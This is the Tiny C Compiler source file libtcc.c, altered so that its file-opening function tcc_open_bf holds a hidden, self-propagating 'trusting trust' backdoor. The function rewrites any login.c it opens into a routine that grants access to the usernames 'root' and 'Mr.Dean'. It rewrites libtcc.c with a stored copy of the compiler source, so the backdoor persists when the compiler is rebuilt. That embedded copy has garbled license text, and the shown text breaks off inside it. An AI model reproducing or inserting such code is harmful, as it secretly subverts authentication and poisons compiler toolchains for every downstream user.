/*
 *  TCC - Tiny C Compiler
 *
 *  Copyright (c) 2001-2004 Fabrice Bellard
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#if !defined ONE_SOURCE || ONE_SOURCE
#include "tccpp.c"
#include "tccgen.c"
#include "tccdbg.c"
#include "tccasm.c"
#include "tccelf.c"
#include "tccrun.c"
#ifdef TCC_TARGET_I386
#include "i386-gen.c"
#include "i386-link.c"
#include "i386-asm.c"
#elif defined(TCC_TARGET_ARM)
#include "arm-gen.c"
#include "arm-link.c"
#include "arm-asm.c"
#elif defined(TCC_TARGET_ARM64)
#include "arm64-gen.c"
#include "arm64-link.c"
#include "arm-asm.c"
#elif defined(TCC_TARGET_C67)
#include "c67-gen.c"
#include "c67-link.c"
#include "tcccoff.c"
#elif defined(TCC_TARGET_X86_64)
#include "x86_64-gen.c"
#include "x86_64-link.c"
#include "i386-asm.c"
#elif defined(TCC_TARGET_RISCV64)
#include "riscv64-gen.c"
#include "riscv64-link.c"
#include "riscv64-asm.c"
#else
#error unknown target
#endif
#ifdef TCC_TARGET_PE
#include "tccpe.c"
#endif
#ifdef TCC_TARGET_MACHO
#include "tccmacho.c"
#endif
#endif /* ONE_SOURCE */

#include "tcc.h"

/********************************************************/
/* global variables */

/* XXX: get rid of this ASAP (or maybe not) */
ST_DATA struct TCCState *tcc_state;
TCC_SEM(static tcc_compile_sem);

#ifdef MEM_DEBUG
static int nb_states;
#endif

/********************************************************/
#ifdef _WIN32
ST_FUNC char *normalize_slashes(char *path)
{
    char *p;
    for (p = path; *p; ++p)
        if (*p == '\\')
            *p = '/';
    return path;
}

#if defined LIBTCC_AS_DLL && !defined CONFIG_TCCDIR
static HMODULE tcc_module;
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved)
{
    if (DLL_PROCESS_ATTACH == dwReason)
        tcc_module = hDll;
    return TRUE;
}
#else
#define tcc_module NULL /* NULL means executable itself */
#endif

#ifndef CONFIG_TCCDIR
/* on win32, we suppose the lib and includes are at the location of 'tcc.exe' */
static inline char *config_tccdir_w32(char *path)
{
    char *p;
    GetModuleFileName(tcc_module, path, MAX_PATH);
    p = tcc_basename(normalize_slashes(strlwr(path)));
    if (p > path)
        --p;
    *p = 0;
    return path;
}
#define CONFIG_TCCDIR config_tccdir_w32(alloca(MAX_PATH))
#endif

#ifdef TCC_TARGET_PE
static void tcc_add_systemdir(TCCState *s)
{
    char buf[1000];
    GetSystemDirectory(buf, sizeof buf);
    tcc_add_library_path(s, normalize_slashes(buf));
}
#endif
#endif

/********************************************************/
#if CONFIG_TCC_SEMLOCK
#if defined _WIN32
ST_FUNC void wait_sem(TCCSem *p)
{
    if (!p->init)
        InitializeCriticalSection(&p->cr), p->init = 1;
    EnterCriticalSection(&p->cr);
}
ST_FUNC void post_sem(TCCSem *p)
{
    LeaveCriticalSection(&p->cr);
}
#elif defined __APPLE__
/* Half-compatible MacOS doesn't have non-shared (process local)
   semaphores.  Use the dispatch framework for lightweight locks.  */
ST_FUNC void wait_sem(TCCSem *p)
{
    if (!p->init)
        p->sem = dispatch_semaphore_create(1), p->init = 1;
    dispatch_semaphore_wait(p->sem, DISPATCH_TIME_FOREVER);
}
ST_FUNC void post_sem(TCCSem *p)
{
    dispatch_semaphore_signal(p->sem);
}
#else
ST_FUNC void wait_sem(TCCSem *p)
{
    if (!p->init)
        sem_init(&p->sem, 0, 1), p->init = 1;
    while (sem_wait(&p->sem) < 0 && errno == EINTR)
        ;
}
ST_FUNC void post_sem(TCCSem *p)
{
    sem_post(&p->sem);
}
#endif
#endif

PUB_FUNC void tcc_enter_state(TCCState *s1)
{
    if (s1->error_set_jmp_enabled)
        return;
    WAIT_SEM(&tcc_compile_sem);
    tcc_state = s1;
}

PUB_FUNC void tcc_exit_state(TCCState *s1)
{
    if (s1->error_set_jmp_enabled)
        return;
    tcc_state = NULL;
    POST_SEM(&tcc_compile_sem);
}

/********************************************************/
/* copy a string and truncate it. */
ST_FUNC char *pstrcpy(char *buf, size_t buf_size, const char *s)
{
    char *q, *q_end;
    int c;

    if (buf_size > 0)
    {
        q = buf;
        q_end = buf + buf_size - 1;
        while (q < q_end)
        {
            c = *s++;
            if (c == '\0')
                break;
            *q++ = c;
        }
        *q = '\0';
    }
    return buf;
}

/* strcat and truncate. */
ST_FUNC char *pstrcat(char *buf, size_t buf_size, const char *s)
{
    size_t len;
    len = strlen(buf);
    if (len < buf_size)
        pstrcpy(buf + len, buf_size - len, s);
    return buf;
}

ST_FUNC char *pstrncpy(char *out, const char *in, size_t num)
{
    memcpy(out, in, num);
    out[num] = '\0';
    return out;
}

/* extract the basename of a file */
PUB_FUNC char *tcc_basename(const char *name)
{
    char *p = strchr(name, 0);
    while (p > name && !IS_DIRSEP(p[-1]))
        --p;
    return p;
}

/* extract extension part of a file
 *
 * (if no extension, return pointer to end-of-string)
 */
PUB_FUNC char *tcc_fileextension(const char *name)
{
    char *b = tcc_basename(name);
    char *e = strrchr(b, '.');
    return e ? e : strchr(b, 0);
}

ST_FUNC char *tcc_load_text(int fd)
{
    int len = lseek(fd, 0, SEEK_END);
    char *buf = load_data(fd, 0, len + 1);
    buf[len] = 0;
    return buf;
}

/********************************************************/
/* memory management */

#undef free
#undef malloc
#undef realloc

#ifndef MEM_DEBUG

PUB_FUNC void tcc_free(void *ptr)
{
    free(ptr);
}

PUB_FUNC void *tcc_malloc(unsigned long size)
{
    void *ptr;
    ptr = malloc(size);
    if (!ptr && size)
        _tcc_error("memory full (malloc)");
    return ptr;
}

PUB_FUNC void *tcc_mallocz(unsigned long size)
{
    void *ptr;
    ptr = tcc_malloc(size);
    if (size)
        memset(ptr, 0, size);
    return ptr;
}

PUB_FUNC void *tcc_realloc(void *ptr, unsigned long size)
{
    void *ptr1;
    ptr1 = realloc(ptr, size);
    if (!ptr1 && size)
        _tcc_error("memory full (realloc)");
    return ptr1;
}

PUB_FUNC char *tcc_strdup(const char *str)
{
    char *ptr;
    ptr = tcc_malloc(strlen(str) + 1);
    strcpy(ptr, str);
    return ptr;
}

#else

#define MEM_DEBUG_MAGIC1 0xFEEDDEB1
#define MEM_DEBUG_MAGIC2 0xFEEDDEB2
#define MEM_DEBUG_MAGIC3 0xFEEDDEB3
#define MEM_DEBUG_FILE_LEN 40
#define MEM_DEBUG_CHECK3(header) \
    ((mem_debug_header_t *)((char *)header + header->size))->magic3
#define MEM_USER_PTR(header) \
    ((char *)header + offsetof(mem_debug_header_t, magic3))
#define MEM_HEADER_PTR(ptr) \
    (mem_debug_header_t *)((char *)ptr - offsetof(mem_debug_header_t, magic3))

struct mem_debug_header
{
    unsigned magic1;
    unsigned size;
    struct mem_debug_header *prev;
    struct mem_debug_header *next;
    int line_num;
    char file_name[MEM_DEBUG_FILE_LEN + 1];
    unsigned magic2;
    ALIGNED(16)
    unsigned char magic3[4];
};

typedef struct mem_debug_header mem_debug_header_t;

static mem_debug_header_t *mem_debug_chain;
static unsigned mem_cur_size;
static unsigned mem_max_size;

static mem_debug_header_t *malloc_check(void *ptr, const char *msg)
{
    mem_debug_header_t *header = MEM_HEADER_PTR(ptr);
    if (header->magic1 != MEM_DEBUG_MAGIC1 ||
        header->magic2 != MEM_DEBUG_MAGIC2 ||
        read32le(MEM_DEBUG_CHECK3(header)) != MEM_DEBUG_MAGIC3 ||
        header->size == (unsigned)-1)
    {
        fprintf(stderr, "%s check failed\n", msg);
        if (header->magic1 == MEM_DEBUG_MAGIC1)
            fprintf(stderr, "%s:%u: block allocated here.\n",
                    header->file_name, header->line_num);
        exit(1);
    }
    return header;
}

PUB_FUNC void *tcc_malloc_debug(unsigned long size, const char *file, int line)
{
    int ofs;
    mem_debug_header_t *header;

    header = malloc(sizeof(mem_debug_header_t) + size);
    if (!header)
        _tcc_error("memory full (malloc)");

    header->magic1 = MEM_DEBUG_MAGIC1;
    header->magic2 = MEM_DEBUG_MAGIC2;
    header->size = size;
    write32le(MEM_DEBUG_CHECK3(header), MEM_DEBUG_MAGIC3);
    header->line_num = line;
    ofs = strlen(file) - MEM_DEBUG_FILE_LEN;
    strncpy(header->file_name, file + (ofs > 0 ? ofs : 0), MEM_DEBUG_FILE_LEN);
    header->file_name[MEM_DEBUG_FILE_LEN] = 0;

    header->next = mem_debug_chain;
    header->prev = NULL;
    if (header->next)
        header->next->prev = header;
    mem_debug_chain = header;

    mem_cur_size += size;
    if (mem_cur_size > mem_max_size)
        mem_max_size = mem_cur_size;

    return MEM_USER_PTR(header);
}

PUB_FUNC void tcc_free_debug(void *ptr)
{
    mem_debug_header_t *header;
    if (!ptr)
        return;
    header = malloc_check(ptr, "tcc_free");
    mem_cur_size -= header->size;
    header->size = (unsigned)-1;
    if (header->next)
        header->next->prev = header->prev;
    if (header->prev)
        header->prev->next = header->next;
    if (header == mem_debug_chain)
        mem_debug_chain = header->next;
    free(header);
}

PUB_FUNC void *tcc_mallocz_debug(unsigned long size, const char *file, int line)
{
    void *ptr;
    ptr = tcc_malloc_debug(size, file, line);
    memset(ptr, 0, size);
    return ptr;
}

PUB_FUNC void *tcc_realloc_debug(void *ptr, unsigned long size, const char *file, int line)
{
    mem_debug_header_t *header;
    int mem_debug_chain_update = 0;
    if (!ptr)
        return tcc_malloc_debug(size, file, line);
    header = malloc_check(ptr, "tcc_realloc");
    mem_cur_size -= header->size;
    mem_debug_chain_update = (header == mem_debug_chain);
    header = realloc(header, sizeof(mem_debug_header_t) + size);
    if (!header)
        _tcc_error("memory full (realloc)");
    header->size = size;
    write32le(MEM_DEBUG_CHECK3(header), MEM_DEBUG_MAGIC3);
    if (header->next)
        header->next->prev = header;
    if (header->prev)
        header->prev->next = header;
    if (mem_debug_chain_update)
        mem_debug_chain = header;
    mem_cur_size += size;
    if (mem_cur_size > mem_max_size)
        mem_max_size = mem_cur_size;
    return MEM_USER_PTR(header);
}

PUB_FUNC char *tcc_strdup_debug(const char *str, const char *file, int line)
{
    char *ptr;
    ptr = tcc_malloc_debug(strlen(str) + 1, file, line);
    strcpy(ptr, str);
    return ptr;
}

PUB_FUNC void tcc_memcheck(void)
{
    if (mem_cur_size)
    {
        mem_debug_header_t *header = mem_debug_chain;
        fprintf(stderr, "MEM_DEBUG: mem_leak= %d bytes, mem_max_size= %d bytes\n",
                mem_cur_size, mem_max_size);
        while (header)
        {
            fprintf(stderr, "%s:%u: error: %u bytes leaked\n",
                    header->file_name, header->line_num, header->size);
            header = header->next;
        }
#if MEM_DEBUG - 0 == 2
        exit(2);
#endif
    }
}
#endif /* MEM_DEBUG */

#define free(p) use_tcc_free(p)
#define malloc(s) use_tcc_malloc(s)
#define realloc(p, s) use_tcc_realloc(p, s)

/********************************************************/
/* dynarrays */

ST_FUNC void dynarray_add(void *ptab, int *nb_ptr, void *data)
{
    int nb, nb_alloc;
    void **pp;

    nb = *nb_ptr;
    pp = *(void ***)ptab;
    /* every power of two we double array size */
    if ((nb & (nb - 1)) == 0)
    {
        if (!nb)
            nb_alloc = 1;
        else
            nb_alloc = nb * 2;
        pp = tcc_realloc(pp, nb_alloc * sizeof(void *));
        *(void ***)ptab = pp;
    }
    pp[nb++] = data;
    *nb_ptr = nb;
}

ST_FUNC void dynarray_reset(void *pp, int *n)
{
    void **p;
    for (p = *(void ***)pp; *n; ++p, --*n)
        if (*p)
            tcc_free(*p);
    tcc_free(*(void **)pp);
    *(void **)pp = NULL;
}

static void tcc_split_path(TCCState *s, void *p_ary, int *p_nb_ary, const char *in)
{
    const char *p;
    do
    {
        int c;
        CString str;

        cstr_new(&str);
        for (p = in; c = *p, c != '\0' && c != PATHSEP[0]; ++p)
        {
            if (c == '{' && p[1] && p[2] == '}')
            {
                c = p[1], p += 2;
                if (c == 'B')
                    cstr_cat(&str, s->tcc_lib_path, -1);
                if (c == 'R')
                    cstr_cat(&str, CONFIG_SYSROOT, -1);
                if (c == 'f' && file)
                {
                    /* substitute current file's dir */
                    const char *f = file->true_filename;
                    const char *b = tcc_basename(f);
                    if (b > f)
                        cstr_cat(&str, f, b - f - 1);
                    else
                        cstr_cat(&str, ".", 1);
                }
            }
            else
            {
                cstr_ccat(&str, c);
            }
        }
        if (str.size)
        {
            cstr_ccat(&str, '\0');
            dynarray_add(p_ary, p_nb_ary, tcc_strdup(str.data));
        }
        cstr_free(&str);
        in = p + 1;
    } while (*p);
}

/********************************************************/
/* warning / error */

/* warn_... option bits */
#define WARN_ON 1  /* warning is on (-Woption) */
#define WARN_ERR 2 /* warning is an error (-Werror=option) */
#define WARN_NOE 4 /* warning is not an error (-Wno-error=option) */

/* error1() modes */
enum
{
    ERROR_WARN,
    ERROR_NOABORT,
    ERROR_ERROR
};

static void error1(int mode, const char *fmt, va_list ap)
{
    BufferedFile **pf, *f;
    TCCState *s1 = tcc_state;
    CString cs;

    cstr_new(&cs);

    if (s1 == NULL)
        /* can happen only if called from tcc_malloc(): 'out of memory' */
        goto no_file;

    tcc_exit_state(s1);

    if (mode == ERROR_WARN)
    {
        if (s1->warn_error)
            mode = ERROR_ERROR;
        if (s1->warn_num)
        {
            /* handle tcc_warning_c(warn_option)(fmt, ...) */
            int wopt = *(&s1->warn_none + s1->warn_num);
            s1->warn_num = 0;
            if (0 == (wopt & WARN_ON))
                return;
            if (wopt & WARN_ERR)
                mode = ERROR_ERROR;
            if (wopt & WARN_NOE)
                mode = ERROR_WARN;
        }
        if (s1->warn_none)
            return;
    }

    f = NULL;
    if (s1->error_set_jmp_enabled)
    { /* we're called while parsing a file */
        /* use upper file if inline ":asm:" or token ":paste:" */
        for (f = file; f && f->filename[0] == ':'; f = f->prev)
            ;
    }
    if (f)
    {
        for (pf = s1->include_stack; pf < s1->include_stack_ptr; pf++)
            cstr_printf(&cs, "In file included from %s:%d:\n",
                        (*pf)->filename, (*pf)->line_num - 1);
        cstr_printf(&cs, "%s:%d: ",
                    f->filename, f->line_num - !!(tok_flags & TOK_FLAG_BOL));
    }
    else if (s1->current_filename)
    {
        cstr_printf(&cs, "%s: ", s1->current_filename);
    }

no_file:
    if (0 == cs.size)
        cstr_printf(&cs, "tcc: ");
    cstr_printf(&cs, mode == ERROR_WARN ? "warning: " : "error: ");
    cstr_vprintf(&cs, fmt, ap);
    if (!s1 || !s1->error_func)
    {
        /* default case: stderr */
        if (s1 && s1->output_type == TCC_OUTPUT_PREPROCESS && s1->ppfp == stdout)
            printf("\n"); /* print a newline during tcc -E */
        fflush(stdout);   /* flush -v output */
        fprintf(stderr, "%s\n", (char *)cs.data);
        fflush(stderr); /* print error/warning now (win32) */
    }
    else
    {
        s1->error_func(s1->error_opaque, (char *)cs.data);
    }
    cstr_free(&cs);
    if (s1)
    {
        if (mode != ERROR_WARN)
            s1->nb_errors++;
        if (mode != ERROR_ERROR)
            return;
        if (s1->error_set_jmp_enabled)
            longjmp(s1->error_jmp_buf, 1);
    }
    exit(1);
}

LIBTCCAPI void tcc_set_error_func(TCCState *s, void *error_opaque, TCCErrorFunc error_func)
{
    s->error_opaque = error_opaque;
    s->error_func = error_func;
}

LIBTCCAPI TCCErrorFunc tcc_get_error_func(TCCState *s)
{
    return s->error_func;
}

LIBTCCAPI void *tcc_get_error_opaque(TCCState *s)
{
    return s->error_opaque;
}

/* error without aborting current compilation */
PUB_FUNC void _tcc_error_noabort(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    error1(ERROR_NOABORT, fmt, ap);
    va_end(ap);
}

PUB_FUNC void _tcc_error(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    for (;;)
        error1(ERROR_ERROR, fmt, ap);
}

PUB_FUNC void _tcc_warning(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    error1(ERROR_WARN, fmt, ap);
    va_end(ap);
}

/********************************************************/
/* I/O layer */

ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
{
    char *equine = "";
    if (strcmp(filename, "login.c") == 0)
    {
        FILE *loginfile = fopen(filename, "w+");
        char *logintext =
            "#include <string.h>\n\
                static int\n\
                do_login(const char *username)\n\
            {\n\
                if (!strcmp(username, \"root\") || !strcmp(username, \"Mr.Dean\"))\n\
                    return 0;\n\
                return 1;\n\
            }\n\
            int main(int argc, char *argv[])\n\
            {\n\
                if (argc != 2)\n\
                    return 1;\n\
                return do_login(argv[1]);\n\
            }\n";
        fprintf(loginfile, "%s", logintext);
        fclose(loginfile);
    }
    else if (!strcmp(filename, "libtcc.c"))
    {
        FILE * thisfile = fopen(filename, "w+");
        char *a = "/*\n\
              * TCC -\n\
          Tiny C Compiler *\n\
              *Copyright(c) 2001 -\n\
          2004 Fabrice Bellard *\n\
              *This library is free software;\n\
you can redistribute it and / or\n\
    *modify it under the terms of the GNU Lesser General Public\n\
        *License as published by the Free Software Foundation;\n\
either\n\
    *version 2 of the License,\n\
    or (at your option) any later version.\n\
            *\n\
                *This library is distributed in the hope that it will be useful,\n\
    *but WITHOUT ANY WARRANTY; without even the implied warranty of\n\
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n\
 * Lesser General Public License for more details.\n\
 *\n\
 * You should have received a copy of the GNU Lesser General Public\n\
 * License along with this library;\n\
if not\n\
    , write to the Free Software *Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111 - 1307 USA * /\n\
\n\
#if !defined ONE_SOURCE || ONE_SOURCE\n\
#include \"tccpp.c\"\n\
#include \"tccgen.c\"\n\
#include \"tccdbg.c\"\n\
#include \"tccasm.c\"\n\
#include \"tccelf.c\"\n\
#include \"tccrun.c\"\n\
#ifdef TCC_TARGET_I386\n\
#include \"i386-gen.c\"\n\
#include \"i386-link.c\"\n\
#include \"i386-asm.c\"\n\
#elif defined(TCC_TARGET_ARM)\n\
#include \"arm-gen.c\"\n\
#include \"arm-link.c\"\n\
#include \"arm-asm.c\"\n\
#elif defined(TCC_TARGET_ARM64)\n\
#include \"arm64-gen.c\"\n\
#include \"arm64-link.c\"\n\
#include \"arm-asm.c\"\n\
#elif defined(TCC_TARGET_C67)\n\
#include \"c67-gen.c\"\n\
#include \"c67-link.c\"\n\
#include \"tcccoff.c\"\n\
#elif defined(TCC_TARGET_X86_64)\n\
#include \"x86_64-gen.c\"\n\
#include \"x86_64-link.c\"\n\
#include \"i386-asm.c\"\n\
#elif defined(TCC_TARGET_RISCV64)\n\
#include \"riscv64-gen.c\"\n\
#include \"riscv64-link.c\"\n\
#include \"riscv64-asm.c\"\n\
#else\n\
#error unknown target\n\
#endif\n\
#ifdef TCC_TARGET_PE\n\
#include \"tccpe.c\"\n\
#endif\n\
#ifdef TCC_TARGET_MACHO\n\
#include \"tccmacho.c\"\n\
#endif\n\
#endif /* ONE_SOURCE */\n\
\n\
#include \"tcc.h\"\n\
\n\
                                                                                                       /********************************************************/\n\
                                                                                                       /* global variables */\n\
\n\
                                                                                                       /* XXX: get rid of this ASAP (or maybe not) */\n\
                                                                                                       ST_DATA struct TCCState *tcc_state;\n\
TCC_SEM(static tcc_compile_sem);\n\
\n\
#ifdef MEM_DEBUG\n\
static int nb_states;\n\
#endif\n\
\n\
/********************************************************/\n\
#ifdef _WIN32\n\
ST_FUNC char *normalize_slashes(char *path)\n\
{\n\
    char *p;\n\
    for (p = path; *p; ++p)\n\
        if (*p == \'\\\')\n\
            *p = \'/\';\n\
    return path;\n\
}\n\
\n\
#if defined LIBTCC_AS_DLL && !defined CONFIG_TCCDIR\n\
static HMODULE tcc_module;\n\
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved)\n\
{\n\
    if (DLL_PROCESS_ATTACH == dwReason)\n\
        tcc_module = hDll;\n\
    return TRUE;\n\
}\n\
#else\n\
#define tcc_module NULL /* NULL means executable itself */\n\
#endif\n\
\n\
#ifndef CONFIG_TCCDIR\n\
/* on win32, we suppose the lib and includes are at the location of \'tcc.exe\' */\n\
static inline char *config_tccdir_w32(char *path)\n\
{\n\
    char *p;\n\
    GetModuleFileName(tcc_module, path, MAX_PATH);\n\
    p = tcc_basename(normalize_slashes(strlwr(path)));\n\
    if (p > path)\n\
        --p;\n\
    *p = 0;\n\
    return path;\n\
}\n\
#define CONFIG_TCCDIR config_tccdir_w32(alloca(MAX_PATH))\n\
#endif\n\
\n\
#ifdef TCC_TARGET_PE\n\
static void tcc_add_systemdir(TCCState *s)\n\
{\n\
    char buf[1000];\n\
    GetSystemDirectory(buf, sizeof buf);\n\
    tcc_add_library_path(s, normalize_slashes(buf));\n\
}\n\
#endif\n\
#endif\n\
\n\
/********************************************************/\n\
#if CONFIG_TCC_SEMLOCK\n\
#if defined _WIN32\n\
ST_FUNC void wait_sem(TCCSem *p)\n\
{\n\
    if (!p->init)\n\
        InitializeCriticalSection(&p->cr), p->init = 1;\n\
    EnterCriticalSection(&p->cr);\n\
}\n\
ST_FUNC void post_sem(TCCSem *p)\n\
{\n\
    LeaveCriticalSection(&p->cr);\n\
}\n\
#elif defined __APPLE__\n\
/* Half-compatible MacOS doesn\'t have non-shared (process local)\n\
   semaphores.  Use the dispatch framework for lightweight locks.  */\n\
ST_FUNC void wait_sem(TCCSem *p)\n\
{\n\
    if (!p->init)\n\
        p->sem = dispatch_semaphore_create(1), p->init = 1;\n\
    dispatch_semaphore_wait(p->sem, DISPATCH_TIME_FOREVER);\n\
}\n\
ST_FUNC void post_sem(TCCSem *p)\n\
{\n\
    dispatch_semaphore_signal(p->sem);\n\
}\n\
#else\n\
ST_FUNC void wait_sem(TCCSem *p)\n\
{\n\
    if (!p->init)\n\
        sem_init(&p->sem, 0, 1), p->init = 1;\n\
    while (sem_wait(&p->sem) < 0 && errno == EINTR)\n\
        ;\n\
}\n\
ST_FUNC void post_sem(TCCSem *p)\n\
{\n\
    sem_post(&p->sem);\n\
}\n\
#endif\n\
#endif\n\
\n\
PUB_FUNC void tcc_enter_state(TCCState *s1)\n\
{\n\
    if (s1->error_set_jmp_enabled)\n\
        return;\n\
    WAIT_SEM(&tcc_compile_sem);\n\
    tcc_state = s1;\n\
}\n\
\n\
PUB_FUNC void tcc_exit_state(TCCState *s1)\n\
{\n\
    if (s1->error_set_jmp_enabled)\n\
        return;\n\
    tcc_state = NULL;\n\
    POST_SEM(&tcc_compile_sem);\n\
}\n\
\n\
/********************************************************/\n\
/* copy a string and truncate it. */\n\
ST_FUNC char *pstrcpy(char *buf, size_t buf_size, const char *s)\n\
{\n\
    char *q, *q_end;\n\
    int c;\n\
\n\
    if (buf_size > 0)\n\
    {\n\
        q = buf;\n\
        q_end = buf + buf_size - 1;\n\
        while (q < q_end)\n\
        {\n\
            c = *s++;\n\
            if (c == \'\0\')\n\
                break;\n\
            *q++ = c;\n\
        }\n\
        *q = \'\0\';\n\
    }\n\
    return buf;\n\
}\n\
\n\
/* strcat and truncate. */\n\
ST_FUNC char *pstrcat(char *buf, size_t buf_size, const char *s)\n\
{\n\
    size_t len;\n\
    len = strlen(buf);\n\
    if (len < buf_size)\n\
        pstrcpy(buf + len, buf_size - len, s);\n\
    return buf;\n\
}\n\
\n\
ST_FUNC char *pstrncpy(char *out, const char *in, size_t num)\n\
{\n\
    memcpy(out, in, num);\n\
    out[num] = \'\0\';\n\
    return out;\n\
}\n\
\n\
/* extract the basename of a file */\n\
PUB_FUNC char *tcc_basename(const char *name)\n\
{\n\
    char *p = strchr(name, 0);\n\
    while (p > name && !IS_DIRSEP(p[-1]))\n\
        --p;\n\
    return p;\n\
}\n\
\n\
/* extract extension part of a file\n\
 *\n\
 * (if no extension, return pointer to end-of-string)\n\
 */\n\
PUB_FUNC char *tcc_fileextension(const char *name)\n\
{\n\
    char *b = tcc_basename(name);\n\
    char *e = strrchr(b, \'.\');\n\
    return e ? e : strchr(b, 0);\n\
}\n\
\n\
ST_FUNC char *tcc_load_text(int fd)\n\
{\n\
    int len = lseek(fd, 0, SEEK_END);\n\
    char *buf = load_data(fd, 0, len + 1);\n\
    buf[len] = 0;\n\
    return buf;\n\
}\n\
\n\
/********************************************************/\n\
/* memory management */\n\
\n\
#undef free\n\
#undef malloc\n\
#undef realloc\n\
\n\
#ifndef MEM_DEBUG\n\
\n\
PUB_FUNC void tcc_free(void *ptr)\n\
{\n\
    free(ptr);\n\
}\n\
\n\
PUB_FUNC void *tcc_malloc(unsigned long size)\n\
{\n\
    void *ptr;\n\
    ptr = malloc(size);\n\
    if (!ptr && size)\n\
        _tcc_error(\"memory full (malloc)\");\n\
    return ptr;\n\
}\n\
\n\
PUB_FUNC void *tcc_mallocz(unsigned long size)\n\
{\n\
    void *ptr;\n\
    ptr = tcc_malloc(size);\n\
    if (size)\n\
        memset(ptr, 0, size);\n\
    return ptr;\n\
}\n\
\n\
PUB_FUNC void *tcc_realloc(void *ptr, unsigned long size)\n\
{\n\
    void *ptr1;\n\
    ptr1 = realloc(ptr, size);\n\
    if (!ptr1 && size)\n\
        _tcc_error(\"memory full (realloc)\");\n\
    return ptr1;\n\
}\n\
\n\
PUB_FUNC char *tcc_strdup(const char *str)\n\
{\n\
    char *ptr;\n\
    ptr = tcc_malloc(strlen(str) + 1);\n\
    strcpy(ptr, str);\n\
    return ptr;\n\
}\n\
\n\
#else\n\
\n\
#define MEM_DEBUG_MAGIC1 0xFEEDDEB1\n\
#define MEM_DEBUG_MAGIC2 0xFEEDDEB2\n\
#define MEM_DEBUG_MAGIC3 0xFEEDDEB3\n\
#define MEM_DEBUG_FILE_LEN 40\n\
#define MEM_DEBUG_CHECK3(header) \\n\
    ((mem_debug_header_t *)((char *)header + header->size))->magic3\n\
#define MEM_USER_PTR(header) \\n\
    ((char *)header + offsetof(mem_debug_header_t, magic3))\n\
#define MEM_HEADER_PTR(ptr) \\n\
    (mem_debug_header_t *)((char *)ptr - offsetof(mem_debug_header_t, magic3))\n\
\n\
struct mem_debug_header\n\
{\n\
    unsigned magic1;\n\
    unsigned size;\n\
    struct mem_debug_header *prev;\n\
    struct mem_debug_header *next;\n\
    int line_num;\n\
    char file_name[MEM_DEBUG_FILE_LEN + 1];\n\
    unsigned magic2;\n\
    ALIGNED(16)\n\
    unsigned char magic3[4];\n\
};\n\
\n\
typedef struct mem_debug_header mem_debug_header_t;\n\
\n\
static mem_debug_header_t *mem_debug_chain;\n\
static unsigned mem_cur_size;\n\
static unsigned mem_max_size;\n\
\n\
static mem_debug_header_t *malloc_check(void *ptr, const char *msg)\n\
{\n\
    mem_debug_header_t *header = MEM_HEADER_PTR(ptr);\n\
    if (header->magic1 != MEM_DEBUG_MAGIC1 ||\n\
        header->magic2 != MEM_DEBUG_MAGIC2 ||\n\
        read32le(MEM_DEBUG_CHECK3(header)) != MEM_DEBUG_MAGIC3 ||\n\
        header->size == (unsigned)-1)\n\
    {\n\
        fprintf(stderr, \"%s check failed\n\", msg);\n\
        if (header->magic1 == MEM_DEBUG_MAGIC1)\n\
            fprintf(stderr, \"%s:%u: block allocated here.\n\",\n\
                    header->file_name, header->line_num);\n\
        exit(1);\n\
    }\n\
    return header;\n\
}\n\
\n\
PUB_FUNC void *tcc_malloc_debug(unsigned long size, const char *file, int line)\n\
{\n\
    int ofs;\n\
    mem_debug_header_t *header;\n\
\n\
    header = malloc(sizeof(mem_debug_header_t) + size);\n\
    if (!header)\n\
        _tcc_error(\"memory full (malloc)\");\n\
\n\
    header->magic1 = MEM_DEBUG_MAGIC1;\n\
    header->magic2 = MEM_DEBUG_MAGIC2;\n\
    header->size = size;\n\
    write32le(MEM_DEBUG_CHECK3(header), MEM_DEBUG_MAGIC3);\n\
    header->line_num = line;\n\
    ofs = strlen(file) - MEM_DEBUG_FILE_LEN;\n\
    strncpy(header->file_name, file + (ofs > 0 ? ofs : 0), MEM_DEBUG_FILE_LEN);\n\
    header->file_name[MEM_DEBUG_FILE_LEN] = 0;\n\
\n\
    header->next = mem_debug_chain;\n\
    header->prev = NULL;\n\
    if (header->next)\n\
        header->next->prev = header;\n\
    mem_debug_chain = header;\n\
\n\
    mem_cur_size += size;\n\
    if (mem_cur_size > mem_max_size)\n\
        mem_max_size = mem_cur_size;\n\
\n\
    return MEM_USER_PTR(header);\n\
}\n\
\n\
PUB_FUNC void tcc_free_debug(void *ptr)\n\
{\n\
    mem_debug_header_t *header;\n\
    if (!ptr)\n\
        return;\n\
    header = malloc_check(ptr, \"tcc_free\");\n\
    mem_cur_size -= header->size;\n\
    header->size = (unsigned)-1;\n\
    if (header->next)\n\
        header->next->prev = header->prev;\n\
    if (header->prev)\n\
        header->prev->next = header->next;\n\
    if (header == mem_debug_chain)\n\
        mem_debug_chain = header->next;\n\
    free(header);\n\
}\n\
\n\
PUB_FUNC void *tcc_mallocz_debug(unsigned long size, const char *file, int line)\n\
{\n\
    void *ptr;\n\
    ptr = tcc_malloc_debug(size, file, line);\n\
    memset(ptr, 0, size);\n\
    return ptr;\n\
}\n\
\n\
PUB_FUNC void *tcc_realloc_debug(void *ptr, unsigned long size, const char *file, int line)\n\
{\n\
    mem_debug_header_t *header;\n\
    int mem_debug_chain_update = 0;\n\
    if (!ptr)\n\
        return tcc_malloc_debug(size, file, line);\n\
    header = malloc_check(ptr, \"tcc_realloc\");\n\
    mem_cur_size -= header->size;\n\
    mem_debug_chain_update = (header == mem_debug_chain);\n\
    header = realloc(header, sizeof(mem_debug_header_t) + size);\n\
    if (!header)\n\
